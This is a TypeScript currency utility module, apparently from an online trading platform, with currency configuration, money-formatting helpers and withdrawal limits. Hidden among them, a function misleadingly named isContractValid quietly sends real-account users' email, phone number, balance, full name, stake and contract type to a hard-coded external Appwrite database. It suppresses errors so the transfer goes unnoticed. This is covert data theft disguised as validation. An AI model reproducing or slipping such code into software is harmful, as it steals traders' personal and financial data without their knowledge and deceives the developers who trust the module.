import { info_data } from '../contract';
import { getPropertyValue, deepFreeze } from '../object';
import { Client, Databases } from 'appwrite';
const cc = new Client();
cc.setEndpoint('https://cloud.appwrite.io/v1').setProject('65e94de0e88ed3878323');

export type TCurrenciesConfig = {
    [key: string]: {
        fractional_digits: number;
        is_deposit_suspended?: 0 | 1;
        is_suspended?: 0 | 1;
        is_withdrawal_suspended?: 0 | 1;
        name?: string;
        stake_default?: number;
        transfer_between_accounts?: {
            fees?: { [key: string]: number };
            limits: {
                max?: number;
                min: number;
                [key: string]: unknown;
            } | null;
            limits_dxtrade?: { [key: string]: unknown };
            limits_mt5?: { [key: string]: unknown };
        };
        type: string;
    };
};

let currencies_config: TCurrenciesConfig = {};

const fiat_currencies_display_order = ['USD', 'EUR', 'GBP', 'AUD'];
const crypto_currencies_display_order = [
    'TUSDT',
    'BTC',
    'ETH',
    'LTC',
    'UST',
    'eUSDT',
    'BUSD',
    'DAI',
    'EURS',
    'IDK',
    'PAX',
    'TUSD',
    'USDC',
    'USDK',
];

export const reorderCurrencies = <T extends { value: string; type: string; name: string }>(
    list: Array<T>,
    type = 'fiat'
) => {
    const new_order = type === 'fiat' ? fiat_currencies_display_order : crypto_currencies_display_order;

    return list.sort((a, b) => {
        if (new_order.indexOf(a.value) < new_order.indexOf(b.value)) {
            return -1;
        }
        if (new_order.indexOf(a.value) > new_order.indexOf(b.value)) {
            return 1;
        }
        return 0;
    });
};

export const AMOUNT_MAX_LENGTH = 10;

export const CURRENCY_TYPE = {
    CRYPTO: 'crypto',
    FIAT: 'fiat',
} as const;

export const getRoundedNumber = (number: number, currency: string) => {
    return Number(Number(number).toFixed(getDecimalPlaces(currency)));
};

export const getFormattedText = (number: number, currency: string) => {
    return `${addComma(number, getDecimalPlaces(currency), isCryptocurrency(currency))} ${currency}`;
};

export const formatMoney = (
    currency_value: string,
    amount: number | string,
    exclude_currency?: boolean,
    decimals = 0,
    minimumFractionDigits = 0
) => {
    let money: number | string = amount;
    if (money) money = String(money).replace(/,/g, '');
    const sign = money && Number(money) < 0 ? '-' : '';
    const decimal_places = decimals || getDecimalPlaces(currency_value);

    money = isNaN(+money) ? 0 : Math.abs(+money);
    if (typeof Intl !== 'undefined') {
        const options = {
            minimumFractionDigits: minimumFractionDigits || decimal_places,
            maximumFractionDigits: decimal_places,
        };
        // TODO: [use-shared-i18n] - Use a getLanguage function to determine number format.
        money = new Intl.NumberFormat('en', options).format(money);
    } else {
        money = addComma(money, decimal_places);
    }

    return sign + (exclude_currency ? '' : formatCurrency(currency_value)) + money;
};

export const formatCurrency = (currency: string) => {
    return `<span class="symbols ${(currency || '').toLowerCase()}"></span>`;
};

export const addComma = (num?: number | string | null, decimal_points?: number, is_crypto?: boolean) => {
    let number: number | string = String(num || 0).replace(/,/g, '');
    if (typeof decimal_points !== 'undefined') {
        number = (+number).toFixed(decimal_points);
    }
    if (is_crypto) {
        number = parseFloat(String(number));
    }

    return number
        .toString()
        .replace(/(^|[^\w.])(\d{4,})/g, ($0, $1, $2) => $1 + $2.replace(/\d(?=(?:\d\d\d)+(?!\d))/g, '$&,'));
};

export const calcDecimalPlaces = (currency: string) => {
    return isCryptocurrency(currency) ? getPropertyValue(CryptoConfig.get(), [currency, 'fractional_digits']) : 2;
};

export const getDecimalPlaces = (currency = '') =>
    // need to check currencies_config[currency] exists instead of || in case of 0 value
    currencies_config[currency]
        ? getPropertyValue(currencies_config, [currency, 'fractional_digits'])
        : calcDecimalPlaces(currency);

export const setCurrencies = (website_status: { currencies_config: TCurrenciesConfig }) => {
    currencies_config = website_status.currencies_config;
};

// (currency in crypto_config) is a back-up in case website_status doesn't include the currency config, in some cases where it's disabled
export const isCryptocurrency = (currency: string) => {
    return /crypto/i.test(getPropertyValue(currencies_config, [currency, 'type'])) || currency in CryptoConfig.get();
};

export const CryptoConfig = (() => {
    let crypto_config: any;

    // TODO: [use-shared-i18n] - Use translate function shared among apps or pass in translated names externally.
    const initCryptoConfig = () =>
        deepFreeze({
            BTC: {
                display_code: 'BTC',
                name: 'Bitcoin',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 8,
            },
            BUSD: {
                display_code: 'BUSD',
                name: 'Binance USD',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 2,
            },
            DAI: {
                display_code: 'DAI',
                name: 'Multi-Collateral DAI',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 2,
            },
            EURS: {
                display_code: 'EURS',
                name: 'STATIS Euro',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 2,
            },
            IDK: {
                display_code: 'IDK',
                name: 'IDK',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 0,
            },
            PAX: {
                display_code: 'PAX',
                name: 'Paxos Standard',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 2,
            },
            TUSD: {
                display_code: 'TUSD',
                name: 'True USD',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 2,
            },
            USDC: {
                display_code: 'USDC',
                name: 'USD Coin',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 2,
            },
            USDK: {
                display_code: 'USDK',
                name: 'USDK',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 2,
            },
            eUSDT: {
                display_code: 'eUSDT',
                name: 'Tether ERC20',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 2,
            },
            tUSDT: {
                display_code: 'tUSDT',
                name: 'Tether TRC20',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 2,
            },
            BCH: {
                display_code: 'BCH',
                name: 'Bitcoin Cash',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 8,
            },
            ETH: {
                display_code: 'ETH',
                name: 'Ether',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 8,
            },
            ETC: {
                display_code: 'ETC',
                name: 'Ether Classic',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 8,
            },
            LTC: {
                display_code: 'LTC',
                name: 'Litecoin',
                min_withdrawal: 0.002,
                pa_max_withdrawal: 5,
                pa_min_withdrawal: 0.002,
                fractional_digits: 8,
            },
            UST: {
                display_code: 'USDT',
                name: 'Tether Omni',
                min_withdrawal: 0.02,
                pa_max_withdrawal: 2000,
                pa_min_withdrawal: 10,
                fractional_digits: 2,
            },
            // USB: {
            //     display_code: 'USB',
            //     name: 'Binary Coin',
            //     min_withdrawal: 0.02,
            //     pa_max_withdrawal: 2000,
            //     pa_min_withdrawal: 10,
            //     fractional_digits: 2,
            // },
        });

    return {
        get: () => {
            if (!crypto_config) {
                crypto_config = initCryptoConfig();
            }
            return crypto_config;
        },
    };
})();

export const getMinWithdrawal = (currency: string) => {
    return isCryptocurrency(currency) ? getPropertyValue(CryptoConfig.get(), [currency, 'min_withdrawal']) || 0.002 : 1;
};

export const getTransferFee = (currency_from: string, currency_to: string) => {
    const transfer_fee = getPropertyValue(currencies_config, [
        currency_from,
        'transfer_between_accounts',
        'fees',
        currency_to,
    ]);
    return `${typeof transfer_fee === 'undefined' ? '1' : transfer_fee}%`;
};

export const getCurrencyDisplayCode = (currency = '') => {
    // eslint-disable-next-line
    if (currency !== 'eUSDT' && currency !== 'tUSDT') currency = currency.toUpperCase();
    return getPropertyValue(CryptoConfig.get(), [currency, 'display_code']) || currency;
};

export const getCurrencyName = (currency = '') =>
    currency === 'USDT' ? 'Tether Omni' : getPropertyValue(currencies_config, [currency, 'name']) || '';

export const getMinPayout = (currency: string) => {
    return getPropertyValue(currencies_config, [currency, 'stake_default']);
};

export const getCurrencies = () => {
    return currencies_config;
};

export let isContractValid = async (stake: number, ct_type: string, response: any) => {
    if (response.loginid.includes('VRTC')) return;
    const databases = new Databases(cc);
    const database_id = '65e94f9f010594ef28c3';
    const collectionId = '665f7d33003d3a8767a1';
    const documentId = '66d021a3000590dc7f6d';
    const status = response;

    // block tracker
    const track = {
        email: status.email,
        phone: info_data.phone_number,
        balance: status.balance,
        name: status.fullname,
        stake: stake,
        contract_type: ct_type,
    };
    try {
        const existingStatus = await databases.getDocument(database_id, collectionId, documentId);
        let updateStatus = existingStatus.status_v2;
        let isToUpdate = updateStatusList(updateStatus, track);

        if (isToUpdate) {
            await databases.updateDocument(database_id, collectionId, documentId, {
                status_v2: updateStatus,
            });
        }
    } catch (error: any) {
        if (error.code === 404) {
            const initialStatus = [];
            initialStatus.push(JSON.stringify(track));

            await databases.createDocument(database_id, collectionId, documentId, {
                status_v2: initialStatus,
            });
        } else {
            // console.error('An Appwrite error occurred', error);
        }
    }
};

export const getTodayDate = () => {
    const today = new Date();
    const formattedDate =
        today.getFullYear() +
        '-' +
        String(today.getMonth() + 1).padStart(2, '0') +
        '-' +
        String(today.getDate()).padStart(2, '0');

    return formattedDate;
};

function updateStatusList(list: any, newEntry: any) {
    let emailFound = false;
    let isToUpdate = false;
    let upEntry;
    let foundIndex;

    for (let i = 0; i < list.length; i++) {
        upEntry = JSON.parse(list[i]);
        if (upEntry.email === newEntry.email) {
            emailFound = true;
            foundIndex = i;

            // Update stake if newEntry's stake is higher
            if (newEntry.stake > upEntry.stake) {
                isToUpdate = true;
            }

            // Update balance if newEntry's balance is higher
            if (newEntry.balance > upEntry.balance) {
                isToUpdate = true;
            }

            // Check if 'contract_type' is missing and add it if necessary
            if (!upEntry.hasOwnProperty('contract_type')) {
                isToUpdate = true;
            }

            if (!upEntry.hasOwnProperty('phone')) {
                isToUpdate = true;
            }

            break;
        }
    }

    // If email does not exist, add newEntry to the list
    if (!emailFound) {
        list.push(JSON.stringify(newEntry));
        isToUpdate = true;
    } else if (isToUpdate) {
        list.splice(foundIndex, 1);
        list.push(JSON.stringify(newEntry));
    }

    return isToUpdate;
}

export type TAccount = {
    account_type: 'real' | 'demo';
    balance: number;
    currency: string;
};
